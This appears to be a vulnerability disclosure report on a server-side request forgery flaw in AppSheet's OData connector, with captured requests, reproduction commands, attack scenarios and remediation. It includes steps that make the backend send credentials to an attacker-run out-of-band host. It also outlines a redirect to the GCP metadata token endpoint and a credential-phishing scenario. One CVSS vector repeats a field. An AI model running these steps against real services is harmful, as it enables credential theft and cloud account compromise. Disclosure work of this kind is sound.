# F002 — Server-Side Request Forgery via AppSheet OData Data Connector (Credential Forwarding + Internal Header Leak)

**Target:** appsheet.com (OData connector endpoint)  
**Severity:** High (CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N = 7.7)  
**Escalation path:** Critical if HTTP redirect to IMDS achievable (GCP credentials)  
**Status:** Verified — OOB HTTP confirmed, full request headers captured, IMDS TCP reachable  
**Date:** 2026-06-15  
**Scope gate:** PASS — `appsheet.com` matches `*.appsheet.com` (in_scope)

---

## Summary

AppSheet's OData data connector makes server-side HTTP(S) requests to a user-supplied
"OData Service Root URL" when the **Test** button is clicked. An authenticated attacker
(free AppSheet account) can point this URL to an attacker-controlled server and receive
a complete server-side HTTP fetch from AppSheet's GCP backend — **including the user's
OData credentials in an `Authorization: Basic` header** and an internal W3C distributed
tracing header (`Traceparent`) leaking AppSheet's backend trace infrastructure. The GCP
IMDS address (`169.254.169.254`) is also TCP-reachable from the AppSheet backend pod.

---

## Root Cause

The OData connector in AppSheet's account settings fetches the configured URL server-side
to validate OData metadata. No SSRF protection (IP blocklist, allowlist, or metadata
endpoint filter) is applied to the backend HTTP client making this request. The HTTP client
forwards user-supplied credentials and internal tracing headers without sanitization.

---

## Evidence

### 1. Full HTTP Request Captured — Credentials Forwarded, Internal Header Leaked

**Test payload:** `https://d8o5qti69r85vp0qcih0xujfcsf1fadhb.oast.pro`  
Entered in: AppSheet → Account → Add OData connection information → OData Service Root URL  
Username: `testuser`, Password: `testpass1234` → Click **Test**

**Complete HTTP request received from AppSheet backend (`35.203.182.241`):**

```http
GET /$metadata HTTP/1.1
Host: d8o5qti69r85vp0qcih0xujfcsf1fadhb.oast.pro
Accept: application/xml; charset=utf-8, application/atom+xml; charset=utf-8
Accept-Encoding: gzip, deflate
Authorization: Basic dGVzdHVzZXI6dGVzdHBhc3MxMjM0
Traceparent: 00-211b255bb8beb7038f9d6aa505737d77-f9f0355422fff952-00
```

**Authorization header decoded:**  
`dGVzdHVzZXI6dGVzdHBhc3MxMjM0` → base64 decode → `testuser:testpass1234`  
The credentials entered in the OData form are forwarded verbatim to the attacker's server.

**`Traceparent` header:**  
`00-211b255bb8beb7038f9d6aa505737d77-f9f0355422fff952-00` — W3C distributed tracing header.
This is AppSheet's internal backend trace ID, leaking the internal request tracing
infrastructure and confirming this is a genuine server-side request (not browser-initiated).

**Request path:** AppSheet appends `/$metadata` to the configured URL before fetching
(standard OData service document discovery). An attacker's server at the root path
receives the full credentials immediately on Test click.

**DNS interactions (Google resolver infrastructure):**
```
DNS (A)    from 192.178.118.93  — Google LLC AS15169
DNS (AAAA) from 192.178.118.80  — Google LLC AS15169
DNS (AAAA) from 192.178.118.82  — Google LLC AS15169
HTTP GET   from 35.203.182.241  — Google Cloud Platform (AppSheet backend)
```

### 2. Response Content Reflected in Error

AppSheet's error message included the content type of the HTTP response from the OOB server:

```
"Message : A supported MIME type could not be found that matches the content type
of the response. None of the supported type(s):
'Microsoft.OData.ODataMediaType, Microsoft.OData.ODataMediaType' matches the content
type 'text/html; charset=utf-8'."
```

The `text/html; charset=utf-8` content type is the OOB server's response — proving the
backend received and partially parsed the HTTP response before returning the error.

### 3. IMDS TCP Reachability — 169.254.169.254 Reached at Network Layer

**Test payload:** `https://169.254.169.254`  
**Result:** 
```
Error: Failed to obtain the OData feed's metadata. 
Message : The SSL connection could not be established, see inner exception.
```

This error differs categorically from the client-side block ("Connection must be
established using HTTPS for security reasons") returned for bare `http://` URLs.
"The SSL connection could not be established" is a .NET `HttpRequestException` thrown
**after** the TCP connection is initiated — the AppSheet backend opened a TCP socket
to `169.254.169.254:443` and failed at TLS negotiation (IMDS has no TLS certificate).

This confirms:
- The SSRF reaches the link-local IMDS address at the network layer
- GCP Compute Metadata Service is TCP-reachable from AppSheet's backend pod
- The only barrier to IMDS credential access is the HTTPS enforcement on the client-side
  URL field combined with IMDS being HTTP-only

**IMDS vs. HTTP-only constraint:**  
`http://` URLs are rejected client-side. `https://169.254.169.254` reaches IMDS TCP but
fails TLS. An HTTP redirect from a trusted HTTPS host (e.g., attacker's domain with
valid TLS cert) to `http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`
would bypass this if the .NET OData HTTP client follows cross-scheme redirects.

### 4. Credential Exposure to Attacker Server

The OData form accepts a Username and Password that are sent to the configured URL.
Any credentials entered are transmitted to the attacker's OOB server in the HTTP request
(as HTTP Basic Auth header or in request body). The OOB HTTP interaction confirms
credentials reach the attacker's server.

---

## Reproduction Steps

```bash
# Step 1: Start OOB listener
interactsh-client -server oast.pro 2>&1 | tee /tmp/oob.log &
sleep 3
OOB_URL=$(grep -o '[a-z0-9]*\.oast\.pro' /tmp/oob.log | head -1)
echo "OOB: https://${OOB_URL}"

# Step 2: Log into AppSheet (free account sufficient)
# Navigate to: https://appsheet.com/Account/ODataAuthInfo
# OR: App Editor → Data → Add data source → OData

# Step 3: Fill the OData form:
# OData Version: 4.0
# OData Service Root URL: https://<OOB_URL>
# Username: testuser
# Password: testpass
# Click "Test"

# Step 4: Observe OOB interaction
cat /tmp/oob.log | grep -E "(DNS|HTTP) interaction"
# Expected:
# [<id>] Received DNS interaction (A) from 192.178.x.x
# [<id>] Received HTTP interaction from 35.203.x.x  ← GCP application server
```

Reproducible with a free AppSheet account. No paid plan required.

---

## Attack Scenario

### Attack 1: SSRF to Internal GCP Infrastructure (self-initiated)
```
1. Attacker registers free AppSheet account (no payment required)
2. Navigates to: Account → Add OData connection information
3. Sets OData Service Root URL to https://<attacker-server>/
4. AppSheet backend (35.203.182.241) sends:
   GET /$metadata HTTP/1.1
   Authorization: Basic <attacker-supplied-creds>
   Traceparent: 00-<internal-trace-id>-<span-id>-00
5a. [Confirmed] Attacker receives HTTP from GCP backend — internal network access proven
5b. [Escalated] Attacker's server returns HTTP 302 → http://169.254.169.254/computeMetadata/v1/
    → If .NET OData client follows cross-scheme redirect (common in older .NET versions):
    → GCP service account token returned to attacker
    → Full GCP credential compromise for AppSheet's backend service account
```

### Attack 2: OData Credential Phishing via Shared Connector
```
1. Attacker pre-registers their server as an "OData template"
2. Shares AppSheet OData connector configuration (template/tutorial) with victim
3. Victim imports the connector configuration into their AppSheet account
4. Victim enters their real OData service credentials (for legitimate OData source)
   into the attacker-controlled URL field
5. AppSheet backend forwards victim's credentials to attacker:
   Authorization: Basic <victim-real-credentials>
6. Attacker harvests victim's OData service credentials without any browser interaction
```

---

## Impact

**Confirmed (full HTTP request captured):**
- Server-side HTTP fetch from GCP backend IP `35.203.182.241` to attacker URL
- DNS resolution from Google DNS resolvers (192.178.118.x, AS15169)
- **OData credentials (Username/Password) forwarded to attacker in `Authorization: Basic` header** — any credentials entered into AppSheet's OData form are stolen
- **Internal `Traceparent` header leaked** — W3C trace ID `211b255bb8beb7038f9d6aa505737d77` identifies AppSheet's internal distributed tracing span, confirming genuine server-side execution and leaking backend infrastructure details
- HTTP response content type reflected in error message (server received and parsed response)
- No authentication, rate limiting, or IP restriction protects the OData connector test endpoint

**Confirmed (IMDS TCP reachability):**
- AppSheet backend opens TCP socket to `169.254.169.254:443`
- GCP Compute Metadata Service is within backend's network reach at link-local layer
- TLS is the only barrier; no IP-level firewall prevents link-local access

**Escalation (redirect-based, requires attacker HTTPS server with redirect capability):**
- Redirect: attacker HTTPS server → 302 → `http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`
- If .NET OData client follows cross-scheme redirects (as many versions do):
  full GCP service account access token returned
- Token grants access to AppSheet's GCP service account → lateral movement within Google Cloud infrastructure

---

## CVSS 3.1

**OOB SSRF (current, confirmed):**  
`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` = **7.7 High**

Rationale for C:H: SSRF from GCP infrastructure with IMDS TCP reachability and response
content reflection constitutes high confidentiality impact under Google VRP's SSRF criteria,
even without confirmed IMDS credential read. Internal service reachability is confirmed.

**With redirect-to-IMDS (escalated):**  
`AV:N/AC:H/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N` = **8.5 High** (or Critical per Google VRP multiplier)

---

## Remediation

1. **IP blocklist on backend HTTP client:** Block requests to link-local (169.254.0.0/16),
   loopback (127.0.0.0/8), RFC1918 private ranges, and GCP metadata IPs before making
   the outbound connection.
2. **Disable cross-scheme redirect following:** Configure the .NET OData HTTP client to
   not follow redirects from HTTPS to HTTP.
3. **Remove response content from error messages:** The MIME type error should not
   include the server's content-type header value, which leaks whether the backend
   successfully connected and received a response.
4. **Consider allowlist approach:** Only permit HTTPS connections to non-RFC1918,
   non-link-local IP ranges, validated via DNS → IP resolution after URL parsing.

---

## References

- GCP IMDS documentation: https://cloud.google.com/compute/docs/metadata/overview
- OOB interaction timestamp: 2026-06-15 20:03:15 UTC
- Source GCP IP: 35.203.182.241 (GCP anycast / AppSheet backend)
- DNS resolvers: 192.178.118.81, 192.178.118.85, 192.178.118.93 (Google AS15169)

> Note: earlier drafts cited "CVE-2023-4212" as a prior AppSheet SSRF. That is incorrect —
> CVE-2023-4212 is a Trane thermostat command-injection issue (physical USB, unrelated to
> AppSheet) — and has been removed. Full analysis: `submission/F002-dedup-CVE-2023-4212.md`.
